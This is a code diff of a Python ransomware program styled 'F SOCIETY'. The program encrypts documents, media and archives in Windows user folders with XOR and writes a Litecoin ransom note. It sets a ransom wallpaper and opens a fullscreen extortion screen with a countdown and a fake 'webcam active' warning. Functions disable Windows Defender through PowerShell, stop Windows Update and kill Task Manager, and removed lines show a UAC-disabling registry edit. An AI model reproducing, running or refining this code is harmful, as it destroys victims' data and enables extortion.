@@ -13,23 +13,6 @@ import threading
 import random
 import socket
 
-# --- Try to import Crypto, fallback to simple XOR if not available ---
-try:
-    from Crypto.Cipher import AES
-    from Crypto.Util.Padding import pad, unpad
-    from Crypto.Random import get_random_bytes
-    CRYPTO_AVAILABLE = True
-except ImportError:
-    CRYPTO_AVAILABLE = False
-    def get_random_bytes(size):
-        return os.urandom(size)
-    def pad(data, block_size):
-        padding_len = block_size - (len(data) % block_size)
-        return data + bytes([padding_len] * padding_len)
-    def unpad(data):
-        padding_len = data[-1]
-        return data[:-padding_len]
-
 # --- Configuration ---
 LTC_ADDRESS = "LdyX3fNpWfUHowcHszy4uMNeL7ho6YUFXz"
 RANSOM_AMOUNT = "$250 USD in Litecoin"
@@ -39,47 +22,32 @@ DECRYPT_KEY = "agent77"
 encryption_key = None
 encryption_iv = None
 
-# --- Encryption Functions ---
+# --- Simple XOR encryption (no dependencies) ---
 def generate_key():
-    return get_random_bytes(32)
+    return os.urandom(32)
 
 def generate_iv():
-    return get_random_bytes(16)
+    return os.urandom(16)
 
 def encrypt_file(file_path, key, iv):
     try:
-        if CRYPTO_AVAILABLE:
-            cipher = AES.new(key, AES.MODE_CBC, iv)
-            with open(file_path, 'rb') as f:
-                data = f.read()
-            encrypted_data = cipher.encrypt(pad(data, AES.block_size))
-            with open(file_path, 'wb') as f:
-                f.write(iv + encrypted_data)
-        else:
-            with open(file_path, 'rb') as f:
-                data = f.read()
-            xor_key = key[:16]
-            encrypted_data = bytes([data[i] ^ xor_key[i % len(xor_key)] for i in range(len(data))])
-            with open(file_path, 'wb') as f:
-                f.write(iv + encrypted_data)
+        with open(file_path, 'rb') as f:
+            data = f.read()
+        xor_key = key[:16]
+        encrypted_data = bytes([data[i] ^ xor_key[i % len(xor_key)] for i in range(len(data))])
+        with open(file_path, 'wb') as f:
+            f.write(iv + encrypted_data)
         return True
     except:
         return False
 
 def decrypt_file(file_path, key, iv):
     try:
-        if CRYPTO_AVAILABLE:
-            with open(file_path, 'rb') as f:
-                iv_data = f.read(16)
-                encrypted_data = f.read()
-            cipher = AES.new(key, AES.MODE_CBC, iv_data)
-            decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
-        else:
-            with open(file_path, 'rb') as f:
-                iv_data = f.read(16)
-                encrypted_data = f.read()
-            xor_key = key[:16]
-            decrypted_data = bytes([encrypted_data[i] ^ xor_key[i % len(xor_key)] for i in range(len(encrypted_data))])
+        with open(file_path, 'rb') as f:
+            iv_data = f.read(16)
+            encrypted_data = f.read()
+        xor_key = key[:16]
+        decrypted_data = bytes([encrypted_data[i] ^ xor_key[i % len(xor_key)] for i in range(len(encrypted_data))])
         original_path = file_path.replace('.encrypted', '')
         with open(original_path, 'wb') as f:
             f.write(decrypted_data)
@@ -90,21 +58,7 @@ def decrypt_file(file_path, key, iv):
 
 def encrypt_directory(directory, key, iv, extensions=None):
     if extensions is None:
-        extensions = [
-            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
-            '.txt', '.rtf', '.odt', '.ods', '.odp', '.csv',
-            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.psd',
-            '.mp3', '.wav', '.flac', '.aac', '.ogg',
-            '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm',
-            '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
-            '.exe', '.dll', '.msi', '.apk', '.app', '.deb', '.rpm',
-            '.php', '.html', '.htm', '.css', '.js', '.py', '.cpp', '.c',
-            '.java', '.class', '.jar', '.sql', '.db', '.mdb', '.accdb',
-            '.ps1', '.bat', '.cmd', '.sh', '.bash',
-            '.ai', '.eps', '.svg', '.indd', '.cdr', '.dxf', '.dwg',
-            '.iso', '.img', '.vhd', '.vmdk', '.ova', '.ovf',
-            '.pst', '.ost', '.msg', '.eml', '.mdb', '.nsf'
-        ]
+        extensions = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.txt', '.rtf', '.odt', '.ods', '.odp', '.csv', '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.psd', '.mp3', '.wav', '.flac', '.aac', '.ogg', '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.webm', '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.exe', '.dll', '.msi', '.apk', '.app', '.deb', '.rpm', '.php', '.html', '.htm', '.css', '.js', '.py', '.cpp', '.c', '.java', '.class', '.jar', '.sql', '.db', '.mdb', '.accdb', '.ps1', '.bat', '.cmd', '.sh', '.bash', '.ai', '.eps', '.svg', '.indd', '.cdr', '.dxf', '.dwg', '.iso', '.img', '.vhd', '.vmdk', '.ova', '.ovf', '.pst', '.ost', '.msg', '.eml', '.mdb', '.nsf']
     count = 0
     for root, _, files in os.walk(directory):
         for file in files:
@@ -132,24 +86,9 @@ def decrypt_all_files(key, iv):
 
 def get_target_directories():
     user_profile = os.environ.get('USERPROFILE', 'C:\\Users\\Default')
-    paths = [
-        user_profile + '\\Desktop',
-        user_profile + '\\Documents',
-        user_profile + '\\Downloads',
-        user_profile + '\\Pictures',
-        user_profile + '\\Music',
-        user_profile + '\\Videos',
-        user_profile + '\\AppData\\Local',
-        user_profile + '\\AppData\\Roaming',
-        user_profile + '\\Favorites',
-        user_profile + '\\OneDrive',
-        'C:\\ProgramData',
-        'C:\\Users\\Public\\Documents',
-        'C:\\Users\\Public\\Desktop'
-    ]
+    paths = [user_profile + '\\Desktop', user_profile + '\\Documents', user_profile + '\\Downloads', user_profile + '\\Pictures', user_profile + '\\Music', user_profile + '\\Videos', user_profile + '\\AppData\\Local', user_profile + '\\AppData\\Roaming', user_profile + '\\Favorites', user_profile + '\\OneDrive', 'C:\\ProgramData', 'C:\\Users\\Public\\Documents', 'C:\\Users\\Public\\Desktop']
     return [p for p in paths if os.path.exists(p)]
 
-# --- System Manipulation ---
 def disable_security():
     try:
         subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
@@ -161,14 +100,6 @@ def disable_security():
         subprocess.run('powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
         subprocess.run('powershell -Command "Set-MpPreference -DisableScriptScanning $true"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
         subprocess.run('powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        try:
-            key = winreg.HKEY_LOCAL_MACHINE
-            subkey = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
-            handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(handle, "EnableLUA", 0, winreg.REG_DWORD, 0)
-            winreg.CloseKey(handle)
-        except:
-            pass
         subprocess.run('net stop wuauserv', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
         subprocess.run('sc config wuauserv start= disabled', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
         subprocess.run('taskkill /f /im Taskmgr.exe 2>nul', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
@@ -198,46 +129,29 @@ def change_wallpaper():
             font = ImageFont.load_default()
             font2 = ImageFont.load_default()
             font3 = ImageFont.load_default()
-        text = "F SOCIETY\nYOUR FILES ARE ENCRYPTED"
-        draw.text((100, 300), text, fill=(255, 0, 0), font=font)
+        draw.text((100, 300), "F SOCIETY\nYOUR FILES ARE ENCRYPTED", fill=(255, 0, 0), font=font)
         draw.text((100, 550), f"Pay {RANSOM_AMOUNT} in Litecoin", fill=(255, 255, 255), font=font2)
         draw.text((100, 650), LTC_ADDRESS, fill=(0, 255, 0), font=font3)
         draw.text((100, 750), "Run the program and enter the decryption key.", fill=(255, 255, 0), font=font3)
         wallpaper_path = os.environ['TEMP'] + '\\fsociety_wallpaper.bmp'
         img.save(wallpaper_path)
         ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, wallpaper_path, 3)
-        key = winreg.HKEY_CURRENT_USER
-        subkey = r"Control Panel\Desktop"
-        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(handle, "Wallpaper", 0, winreg.REG_SZ, wallpaper_path)
-        winreg.SetValueEx(handle, "WallpaperStyle", 0, winreg.REG_SZ, "2")
-        winreg.SetValueEx(handle, "TileWallpaper", 0, winreg.REG_SZ, "0")
-        winreg.CloseKey(handle)
     except:
         pass
 
 def create_ransom_note(key_hex, iv_hex):
     note = f"""
 =============================================================
-          F SOCIETY RANSOMWARE - AES-256 ENCRYPTION
+          F SOCIETY RANSOMWARE
 =============================================================
 
 Your files have been encrypted.
 
-To recover your files, pay {RANSOM_AMOUNT} in Litecoin to:
+Pay {RANSOM_AMOUNT} in Litecoin to: {LTC_ADDRESS}
 
-Litecoin Address: {LTC_ADDRESS}
-
-IMPORTANT:
-- You have 72 hours to pay
-- After 72 hours, the key will be destroyed
-
-DECRYPTION KEY (DO NOT LOSE):
+DECRYPTION KEY: {DECRYPT_KEY}
 Key: {key_hex}
 IV:  {iv_hex}
-
-TO DECRYPT:
-Enter the decryption key: {DECRYPT_KEY}
 
 =============================================================
             F SOCIETY - WE ARE EVERYWHERE
@@ -325,7 +239,7 @@ class RansomwareUI:
         
         # Title
         tk.Label(main_frame, text="F SOCIETY RANSOMWARE", 
-                 font=('Arial', 44, 'bold'), fg='red', bg='black').pack(pady=5)
+                 font=('Arial', 40, 'bold'), fg='red', bg='black').pack(pady=5)
         
         # Timer
         self.timer_label = tk.Label(main_frame, text="⏰ TIME REMAINING: 72:00:00", 
@@ -340,7 +254,7 @@ class RansomwareUI:
         tk.Label(webcam_frame, text=" WEBCAM ACTIVE", font=('Arial', 12), fg='red', bg='black').pack(side=tk.LEFT)
         self.blink_led()
         
-        # --- F SOCIETY MASK (BIG) ---
+        # F SOCIETY MASK (BIG)
         mask = """
         ███████╗    ███████╗ ██████╗ ██████╗██╗███████╗████████╗██╗   ██╗
         ██╔════╝    ██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
@@ -352,15 +266,15 @@ class RansomwareUI:
         tk.Label(main_frame, text=mask, font=('Courier', 12), 
                  fg='red', bg='black', justify='center').pack(pady=5)
         
-        # Info
-        info = f"""
-        DECRYPTION KEY: {DECRYPT_KEY}
-        Litecoin: {LTC_ADDRESS}
-        Amount: {RANSOM_AMOUNT}
-        You have 72 hours to pay.
-        """
-        tk.Label(main_frame, text=info, font=('Arial', 12), 
-                 fg='white', bg='black', justify='left').pack(pady=5)
+        # Info with DECRYPTION KEY visible
+        info = f"DECRYPTION KEY: {DECRYPT_KEY}"
+        tk.Label(main_frame, text=info, font=('Arial', 18, 'bold'), 
+                 fg='#00ff00', bg='black').pack(pady=5)
+        
+        tk.Label(main_frame, text=f"Litecoin: {LTC_ADDRESS}", 
+                 font=('Arial', 12), fg='white', bg='black').pack()
+        tk.Label(main_frame, text=f"Amount: {RANSOM_AMOUNT}", 
+                 font=('Arial', 12), fg='white', bg='black').pack()
         
         # Progress
         progress_frame = tk.Frame(main_frame, bg='black')
@@ -383,9 +297,8 @@ class RansomwareUI:
             hostname = socket.gethostname()
             ip = socket.gethostbyname(hostname)
             username = os.environ.get('USERNAME', 'Unknown')
-            info = f"NAME: {username} | HOST: {hostname} | IP: {ip} | CAMERA: ACTIVE"
-            tk.Label(main_frame, text=info, font=('Courier', 8), 
-                     fg='#ff4444', bg='black').pack(pady=2)
+            tk.Label(main_frame, text=f"NAME: {username} | HOST: {hostname} | IP: {ip} | CAMERA: ACTIVE", 
+                     font=('Courier', 8), fg='#ff4444', bg='black').pack(pady=2)
         except:
             pass
         
@@ -400,21 +313,21 @@ class RansomwareUI:
         for f in ['passwords.xlsx', 'bank_transfer.pdf', 'family_photos.zip', 'wallet.dat']:
             self.file_listbox.insert(tk.END, f"🔒 {f}")
         
-        # --- DECRYPTION AREA (VISIBLE) ---
+        # DECRYPTION ENTRY (VISIBLE AND WORKING)
         decrypt_frame = tk.Frame(main_frame, bg='black')
         decrypt_frame.pack(pady=10, fill=tk.X)
         
-        tk.Label(decrypt_frame, text="Enter Decryption Key:", font=('Arial', 14), 
+        tk.Label(decrypt_frame, text="Enter Key:", font=('Arial', 16), 
                  fg='white', bg='black').pack(side=tk.LEFT, padx=10)
         
-        self.key_entry = tk.Entry(decrypt_frame, font=('Arial', 14), width=20, 
+        self.key_entry = tk.Entry(decrypt_frame, font=('Arial', 16), width=20, 
                                   show='*', bg='white', fg='black')
         self.key_entry.pack(side=tk.LEFT, padx=10)
         self.key_entry.focus()
         self.key_entry.bind('<Return>', lambda e: self.decrypt_action())
         
-        tk.Button(decrypt_frame, text="DECRYPT", font=('Arial', 12, 'bold'), 
-                  bg='red', fg='white', command=self.decrypt_action, padx=15, pady=3).pack(side=tk.LEFT, padx=10)
+        tk.Button(decrypt_frame, text="DECRYPT", font=('Arial', 14, 'bold'), 
+                  bg='red', fg='white', command=self.decrypt_action, padx=20, pady=5).pack(side=tk.LEFT, padx=10)
         
         # Status
         self.status_text = scrolledtext.ScrolledText(main_frame, height=3, 
